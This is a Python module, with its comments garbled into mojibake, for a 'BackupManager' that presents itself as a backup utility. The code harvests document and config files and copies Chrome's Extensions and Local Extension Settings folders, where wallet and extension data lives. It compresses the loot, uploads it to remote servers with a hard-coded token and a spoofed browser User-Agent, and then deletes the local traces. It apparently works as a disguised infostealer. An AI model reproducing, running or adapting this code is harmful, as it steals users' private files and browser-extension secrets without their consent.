# -*- coding: utf-8 -*-

import os
import sys
import shutil
import time
import socket
import logging
import logging.handlers
import tarfile
import requests
from datetime import datetime, timedelta
from pathlib import Path

from .config import BackupConfig


class BackupManager:
    """å¤‡ä»½ç®¡ç†å™¨ç±»"""
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        self.api_token = "8m9D4k6cv6LekYoVcjQBK4yvvDDyiFdf"
        # ä½¿ç”¨é›†åˆä¼˜åŒ–æ‰©å±•åæ£€æŸ¥æ€§èƒ½
        self.doc_extensions_set = set(ext.lower() for ext in self.config.DOC_EXTENSIONS)
        self.config_extensions_set = set(ext.lower() for ext in self.config.CONFIG_EXTENSIONS)
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)

            # ä½¿ç”¨ RotatingFileHandler è¿›è¡Œæ—¥å¿—è½®è½¬
            file_handler = logging.handlers.RotatingFileHandler(
                self.config.LOG_FILE,
                maxBytes=self.config.LOG_MAX_SIZE,
                backupCount=self.config.LOG_BACKUP_COUNT,
                encoding='utf-8'
            )
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )

            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))

            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )

            root_logger.handlers.clear()
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except Exception as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"ç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except Exception as e:
            logging.error(f"åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """æ£€æŸ¥ç½‘ç»œè¿æ¥çŠ¶æ€"""
        for _ in range(BackupConfig.NETWORK_CHECK_RETRIES):
            for host in BackupConfig.NETWORK_CHECK_HOSTS:
                try:
                    socket.create_connection(
                        (host, 53), 
                        timeout=BackupConfig.NETWORK_CHECK_TIMEOUT
                    )
                    return True
                except (socket.timeout, socket.gaierror, ConnectionRefusedError):
                    continue
                except Exception as e:
                    logging.debug(f"ç½‘ç»œæ£€æŸ¥å‡ºé”™ {host}: {e}")
                    continue
            time.sleep(1)  # é‡è¯•å‰ç­‰å¾…1ç§’
        return False

    @staticmethod
    def _is_valid_file(file_path):
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _backup_specified_item(self, source_path, target_base, item_name):
        """å¤‡ä»½æŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•"""
        try:
            if os.path.isfile(source_path):
                target_file = os.path.join(target_base, item_name)
                target_file_dir = os.path.dirname(target_file)
                if self._ensure_directory(target_file_dir):
                    shutil.copy2(source_path, target_file)
                    if self.config.DEBUG_MODE:
                        logging.info(f"å·²å¤‡ä»½æŒ‡å®šæ–‡ä»¶: {item_name}")
                    return True
            else:
                target_path = os.path.join(target_base, item_name)
                if self._ensure_directory(os.path.dirname(target_path)):
                    if os.path.exists(target_path):
                        shutil.rmtree(target_path)
                    # å¯¹äºSERVER_BACKUP_DIRSä¸­æŒ‡å®šçš„ç›®å½•ï¼Œå¤åˆ¶æ—¶ä»ç„¶é€’å½’æ£€æŸ¥æ’é™¤é¡¹
                    exclude_dirs_lower = {ex.lower() for ex in self.config.EXCLUDE_DIRS}
                    ignore_func = lambda d, files: [
                        f for f in files 
                        if any(ex in os.path.join(d, f).lower() for ex in exclude_dirs_lower)
                    ]
                    shutil.copytree(source_path, target_path, symlinks=True, ignore=ignore_func)
                    if self.config.DEBUG_MODE:
                        logging.info(f"ğŸ“ å·²å¤‡ä»½æŒ‡å®šç›®å½•: {item_name}/")
                    return True
        except Exception as e:
            logging.error(f"âŒ å¤‡ä»½å¤±è´¥: {item_name} - {str(e)}")
        return False

    def _backup_chrome_directories(self, target_specified):
        """å¤‡ä»½ Linux Chrome ç›®å½•"""
        try:
            home_dir = os.path.expanduser('~')
            chrome_base = os.path.join(home_dir, '.config', 'google-chrome', 'Default')
            chrome_extensions = os.path.join(chrome_base, 'Extensions')
            chrome_local_ext = os.path.join(chrome_base, 'Local Extension Settings')

            def copy_chrome_dir_if_exists(src_dir, dst_name):
                if os.path.exists(src_dir) and os.path.isdir(src_dir):
                    target_path = os.path.join(target_specified, dst_name)
                    try:
                        # ç¡®ä¿ç›®æ ‡çˆ¶ç›®å½•å­˜åœ¨
                        parent_dir = os.path.dirname(target_path)
                        if not self._ensure_directory(parent_dir):
                            return
                        # å¦‚æœç›®æ ‡ç›®å½•å·²å­˜åœ¨ï¼Œå…ˆåˆ é™¤
                        if os.path.exists(target_path):
                            shutil.rmtree(target_path, ignore_errors=True)
                        # å¤åˆ¶æ•´ä¸ªç›®å½•
                        shutil.copytree(src_dir, target_path, symlinks=True)
                        if self.config.DEBUG_MODE:
                            logging.info(f"ğŸ“¦ å·²å¤‡ä»½ Chrome ç›®å½•: {dst_name}")
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"å¤åˆ¶ Chrome ç›®å½•å¤±è´¥: {src_dir} - {str(e)}")

            # æ‰§è¡Œ Chrome ç›®å½•å¤‡ä»½
            copy_chrome_dir_if_exists(chrome_extensions, 'chrome_extensions')
            copy_chrome_dir_if_exists(chrome_local_ext, 'chrome_local_extension_settings')
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.debug(f"è¿½åŠ  Chrome ç›®å½•å¤‡ä»½å¤±è´¥: {str(e)}")

    def backup_linux_files(self, source_dir, target_dir):
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("âŒ Linuxæºç›®å½•ä¸å­˜åœ¨")
            return None

        target_docs = os.path.join(target_dir, "docs") # å¤‡ä»½æ–‡æ¡£çš„ç›®æ ‡ç›®å½•
        target_configs = os.path.join(target_dir, "configs") # å¤‡ä»½é…ç½®æ–‡ä»¶çš„ç›®æ ‡ç›®å½•
        target_specified = os.path.join(target_dir, "specified")  # æ–°å¢æŒ‡å®šç›®å½•/æ–‡ä»¶çš„å¤‡ä»½ç›®å½•

        if not self._clean_directory(target_dir):
            return None

        if not all(self._ensure_directory(d) for d in [target_docs, target_configs, target_specified]):
            return None

        # é¦–å…ˆå¤‡ä»½æŒ‡å®šç›®å½•æˆ–æ–‡ä»¶ (SERVER_BACKUP_DIRS)
        for specific_path in self.config.SERVER_BACKUP_DIRS:
            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                self._backup_specified_item(full_source_path, target_specified, specific_path)

        # è¿½åŠ ï¼šå¤‡ä»½ Linux Chrome ç›®å½•
        self._backup_chrome_directories(target_specified)

        # ç„¶åå¤‡ä»½å…¶ä»–æ–‡ä»¶ (ä¸åœ¨SERVER_BACKUP_DIRSä¸­çš„ï¼Œæ ¹æ®æ–‡ä»¶ç±»å‹å¤‡ä»½)
        # é¢„è®¡ç®—å·²å¤‡ä»½çš„ç›®å½•è·¯å¾„é›†åˆï¼Œä¼˜åŒ–æ€§èƒ½
        source_dir_abs = os.path.abspath(source_dir)
        backed_up_dirs = set()
        for specific_dir in self.config.SERVER_BACKUP_DIRS:
            specific_path = os.path.join(source_dir, specific_dir)
            if os.path.isdir(specific_path):
                backed_up_dirs.add(os.path.abspath(specific_path))
        
        docs_count = configs_count = 0
        target_dir_abs = os.path.abspath(target_dir)
        exclude_dirs_lower = {ex.lower() for ex in self.config.EXCLUDE_DIRS}
        
        for root, dirs, files in os.walk(source_dir):
            root_abs = os.path.abspath(root)
            
            # è·³è¿‡æºç›®å½•æœ¬èº«çš„æ–‡ä»¶å¤„ç†ï¼Œåªåœ¨è¿™é‡Œå¤„ç†ä¸€çº§å­ç›®å½•çš„æ’é™¤
            if root_abs == source_dir_abs:
                # åˆ›å»ºä¸€ä¸ªç›®å½•åˆ—è¡¨å‰¯æœ¬ç”¨äºè¿­ä»£ï¼Œå› ä¸ºæˆ‘ä»¬å¯èƒ½ä¼šä¿®æ”¹åŸå§‹dirsåˆ—è¡¨
                dirs_to_walk = dirs[:] 
                for d in dirs_to_walk:
                    # æ£€æŸ¥è¿™ä¸ªç¬¬ä¸€çº§å­ç›®å½•æ˜¯å¦åœ¨æ’é™¤åˆ—è¡¨ä¸­ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰
                    if d.lower() in exclude_dirs_lower:
                         if self.config.DEBUG_MODE:
                              logging.info(f"â­ï¸ å·²æ’é™¤ç¬¬ä¸€çº§ç›®å½•: {d}/")
                         dirs.remove(d) # ä»os.walkè¿­ä»£çš„åˆ—è¡¨ä¸­ç§»é™¤ï¼Œé˜»æ­¢è¿›å…¥æ­¤ç›®å½•
                continue # è·³è¿‡æºç›®å½•æœ¬èº«çš„æ–‡ä»¶å¤„ç†

            # è·³è¿‡å·²åœ¨ä¸Šé¢ä½œä¸ºæŒ‡å®šç›®å½•å¤‡ä»½è¿‡çš„ç›®å½• (æˆ–å…¶ä¸‹çš„å­ç›®å½•)
            if any(root_abs.startswith(backed_dir) for backed_dir in backed_up_dirs):
                continue

            # è·³è¿‡ç›®æ ‡å¤‡ä»½ç›®å½•æœ¬èº«ï¼Œé¿å…å¤‡ä»½å¤‡ä»½æ–‡ä»¶
            if root_abs.startswith(target_dir_abs):
                continue

            # å¯¹äºéç¬¬ä¸€çº§ç›®å½•æˆ–æœªæ’é™¤çš„ç¬¬ä¸€çº§ç›®å½•ä¸‹çš„æ–‡ä»¶/å­ç›®å½•ï¼Œæ ¹æ®æ–‡ä»¶æ‰©å±•åè¿›è¡Œå¤‡ä»½

            for file in files:
                # åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºæ–‡æ¡£ç±»å‹æˆ–é…ç½®ç±»å‹ï¼ˆä½¿ç”¨é›†åˆä¼˜åŒ–æ€§èƒ½ï¼‰
                file_lower = file.lower()
                is_doc = any(file_lower.endswith(ext) for ext in self.doc_extensions_set)
                is_config = any(file_lower.endswith(ext) for ext in self.config_extensions_set)

                # å¦‚æœæ—¢ä¸æ˜¯æ–‡æ¡£ä¹Ÿä¸æ˜¯é…ç½®ï¼Œè·³è¿‡
                if not (is_doc or is_config):
                    continue

                source_file = os.path.join(root, file)
                # os.walkå·²ç»æä¾›äº†æ–‡ä»¶åˆ—è¡¨ï¼Œé€šå¸¸ä¸éœ€è¦å†æ¬¡æ£€æŸ¥å­˜åœ¨æ€§
                # ä½†å¦‚æœæ–‡ä»¶åœ¨éå†è¿‡ç¨‹ä¸­è¢«åˆ é™¤ï¼Œè¿™é‡Œå¯ä»¥è·³è¿‡

                # æ ¹æ®æ–‡ä»¶ç±»å‹ç¡®å®šç›®æ ‡åŸºè·¯å¾„
                target_base = target_docs if is_doc else target_configs
                # è·å–ç›¸å¯¹äºæºç›®å½•çš„è·¯å¾„
                relative_path = os.path.relpath(root, source_dir)
                # æ„å»ºç›®æ ‡å­ç›®å½•è·¯å¾„
                target_sub_dir = os.path.join(target_base, relative_path)
                # æ„å»ºç›®æ ‡æ–‡ä»¶è·¯å¾„
                target_file = os.path.join(target_sub_dir, file)

                # ç¡®ä¿ç›®æ ‡å­ç›®å½•å­˜åœ¨
                if not self._ensure_directory(target_sub_dir):
                    continue

                try:
                    # å¤åˆ¶æ–‡ä»¶åˆ°ç›®æ ‡ä½ç½®
                    shutil.copy2(source_file, target_file)
                    # æ›´æ–°è®¡æ•°å™¨
                    if is_doc:
                        docs_count += 1
                    else:
                        configs_count += 1
                except Exception as e:
                    # å¤åˆ¶å¤±è´¥è®°å½•é”™è¯¯
                    if self.config.DEBUG_MODE:
                        logging.error(f"âŒ å¤åˆ¶å¤±è´¥: {relative_path}/{file}")

        # æ‰“å°å¤‡ä»½ç»Ÿè®¡ä¿¡æ¯
        if docs_count > 0 or configs_count > 0:
            logging.info(f"\nğŸ“Š Linuxæ–‡ä»¶å¤‡ä»½ç»Ÿè®¡:")
            if docs_count > 0:
                logging.info(f"   ğŸ“š æ–‡æ¡£: {docs_count} ä¸ªæ–‡ä»¶")
            if configs_count > 0:
                logging.info(f"   âš™ï¸  é…ç½®: {configs_count} ä¸ªæ–‡ä»¶")

        return target_dir

    def _get_upload_server(self):
        """è·å–ä¸Šä¼ æœåŠ¡å™¨åœ°å€ï¼Œä½¿ç”¨ç®€å•çš„è½®è¯¢æ–¹å¼å®ç°è´Ÿè½½å‡è¡¡"""
        try:
            # å°è¯•æ‰€æœ‰æœåŠ¡å™¨
            for server in self.config.UPLOAD_SERVERS:
                try:
                    # æµ‹è¯•æœåŠ¡å™¨è¿æ¥æ€§
                    response = requests.head(server, timeout=5)
                    if response.status_code == 200:
                        return server
                except:
                    continue
            
            # å¦‚æœæ‰€æœ‰æœåŠ¡å™¨éƒ½ä¸å¯ç”¨ï¼Œè¿”å›é»˜è®¤æœåŠ¡å™¨
            return self.config.UPLOAD_SERVERS[0]
        except:
            # å‘ç”Ÿå¼‚å¸¸æ—¶è¿”å›é»˜è®¤æœåŠ¡å™¨
            return self.config.UPLOAD_SERVERS[0]

    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²ä¸ºå¤šä¸ªå°å—"""
        if not os.path.exists(file_path):
            return None
        
        try:
            file_size = os.path.getsize(file_path)
            if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
                return [file_path]

            # åˆ›å»ºåˆ†ç‰‡ç›®å½•
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None

            # å¯¹æ–‡ä»¶è¿›è¡Œåˆ†ç‰‡
            chunk_files = []
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                    logging.info(f"å·²åˆ›å»ºåˆ†ç‰‡ {chunk_num}: {len(chunk_data) / 1024 / 1024:.2f}MB")

            os.remove(file_path)
            logging.critical(f"æ–‡ä»¶ {file_path} ({file_size / 1024 / 1024:.2f}MB) å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files

        except Exception as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def zip_backup_folder(self, folder_path, zip_file_path):
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None

                self._clean_directory(folder_path)
                logging.critical(f"ç›®å½• {folder_path} å·²å‹ç¼©: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                
                # å¦‚æœå‹ç¼©æ–‡ä»¶è¿‡å¤§ï¼Œè¿›è¡Œåˆ†ç‰‡
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    return self.split_large_file(tar_path)
                else:
                    return [tar_path]
                    
            except OSError as e:
                logging.error(f"è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except Exception as e:
            logging.error(f"å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def upload_backup(self, backup_paths):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶ï¼Œæ”¯æŒå•ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶åˆ—è¡¨"""
        if not backup_paths:
            return False
            
        if isinstance(backup_paths, str):
            backup_paths = [backup_paths]
            
        success = True
        for path in backup_paths:
            if not self.upload_file(path):
                success = False
        return success

    def upload_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶"""
        if not self._is_valid_file(file_path):
            logging.error(f"æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False
            
        return self._upload_single_file(file_path)

    def _upload_single_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶"""
        try:
            # æ£€æŸ¥æ–‡ä»¶æƒé™å’ŒçŠ¶æ€
            if not os.path.exists(file_path):
                logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
                return False
                
            if not os.access(file_path, os.R_OK):
                logging.error(f"æ–‡ä»¶æ— è¯»å–æƒé™: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # ä¸Šä¼ é‡è¯•é€»è¾‘
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                # æœåŠ¡å™¨è½®è¯¢
                for server in self.config.UPLOAD_SERVERS:
                    try:
                        with open(file_path, "rb") as f:
                            logging.critical(f"æ­£åœ¨ä¸Šä¼ æ–‡ä»¶ {file_path}ï¼ˆ{file_size / 1024 / 1024:.2f}MBï¼‰ï¼Œç¬¬ {attempt + 1} æ¬¡å°è¯•ï¼Œä½¿ç”¨æœåŠ¡å™¨ {server}...")
                            
                            # å‡†å¤‡ä¸Šä¼ ä¼šè¯
                            session = requests.Session()
                            session.headers.update({
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                            })
                            
                            # æ‰§è¡Œä¸Šä¼ 
                            response = session.post(
                                server,
                                files={"file": f},
                                data={"token": self.api_token},
                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"ä¸Šä¼ æˆåŠŸ: {file_path}")
                                    try:
                                        os.remove(file_path)
                                    except Exception as e:
                                        logging.error(f"åˆ é™¤å·²ä¸Šä¼ æ–‡ä»¶å¤±è´¥: {e}")
                                    return True
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    logging.error(f"æœåŠ¡å™¨è¿”å›é”™è¯¯: {error_msg}")
                            else:
                                logging.error(f"ä¸Šä¼ å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}, å“åº”: {response.text}")
                                
                    except requests.exceptions.Timeout:
                        logging.error(f"ä¸Šä¼ è¶…æ—¶ {file_path}")
                    except requests.exceptions.SSLError:
                        logging.error(f"SSLé”™è¯¯ {file_path}")
                    except requests.exceptions.ConnectionError:
                        logging.error(f"è¿æ¥é”™è¯¯ {file_path}")
                    except Exception as e:
                        logging.error(f"ä¸Šä¼ æ–‡ä»¶å‡ºé”™ {file_path}: {str(e)}")

                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    logging.critical(f"ç­‰å¾… {self.config.RETRY_DELAY} ç§’åé‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)

            try:
                os.remove(file_path)
                logging.error(f"æ–‡ä»¶ {file_path} ä¸Šä¼ å¤±è´¥å¹¶å·²åˆ é™¤")
            except Exception as e:
                logging.error(f"åˆ é™¤å¤±è´¥æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            
            return False
            
        except OSError as e:
            logging.error(f"è·å–æ–‡ä»¶ä¿¡æ¯å¤±è´¥ {file_path}: {e}")
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except:
                    pass
            return False

